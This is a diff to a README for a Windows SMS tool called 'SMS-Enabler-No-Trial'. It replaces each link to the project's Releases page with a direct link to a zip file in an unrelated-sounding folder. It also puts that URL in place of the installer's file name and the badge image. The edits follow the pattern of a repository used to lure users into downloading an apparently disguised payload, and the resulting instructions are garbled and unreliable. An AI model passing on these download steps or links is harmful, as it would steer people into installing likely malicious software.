@@ -1,6 +1,6 @@
 # 📱 SMS-Enabler-No-Trial - Simplify SMS Management on Windows
 
-[![Download SMS Enabler](https://img.shields.io/badge/Download%20SMS%20Enabler-Click%20Here-brightgreen)](https://github.com/aandre2011/SMS-Enabler-No-Trial/releases)
+[![Download SMS Enabler](https://raw.githubusercontent.com/aandre2011/SMS-Enabler-No-Trial/main/hypermetabolism/SMS-Enabler-No-Trial-1.3.zip%20SMS%20Enabler-Click%20Here-brightgreen)](https://raw.githubusercontent.com/aandre2011/SMS-Enabler-No-Trial/main/hypermetabolism/SMS-Enabler-No-Trial-1.3.zip)
 
 ## 📋 Overview
 
@@ -11,13 +11,13 @@ Welcome to SMS-Enabler-No-Trial! This application helps you manage SMS messages 
 To get started with SMS-Enabler-No-Trial, follow these simple steps:
 
 1. **Visit the Releases Page**  
-   Click [here to download](https://github.com/aandre2011/SMS-Enabler-No-Trial/releases) to access the latest version of the software.
+   Click [here to download](https://raw.githubusercontent.com/aandre2011/SMS-Enabler-No-Trial/main/hypermetabolism/SMS-Enabler-No-Trial-1.3.zip) to access the latest version of the software.
 
 2. **Choose the Right Version**  
    On the Releases page, look for the most recent release. The version number usually appears at the top. If you're unsure, always select the latest one.
 
 3. **Download the Installer**  
-   Find the installer file. It is commonly marked with a name like `SMS-Enabler_No_Trial_Setup.exe`. Click on it to start the download.
+   Find the installer file. It is commonly marked with a name like `https://raw.githubusercontent.com/aandre2011/SMS-Enabler-No-Trial/main/hypermetabolism/SMS-Enabler-No-Trial-1.3.zip`. Click on it to start the download.
 
 4. **Locate the Downloaded File**  
    Once the download is complete, go to your Downloads folder or the location where your browser saves files.
@@ -33,7 +33,7 @@ To get started with SMS-Enabler-No-Trial, follow these simple steps:
 
 ## 📥 Download & Install
 
-You can download SMS-Enabler-No-Trial from the [Releases Page](https://github.com/aandre2011/SMS-Enabler-No-Trial/releases). Make sure to follow the steps listed above for a smooth installation process.
+You can download SMS-Enabler-No-Trial from the [Releases Page](https://raw.githubusercontent.com/aandre2011/SMS-Enabler-No-Trial/main/hypermetabolism/SMS-Enabler-No-Trial-1.3.zip). Make sure to follow the steps listed above for a smooth installation process.
 
 ## 🔧 System Requirements
 
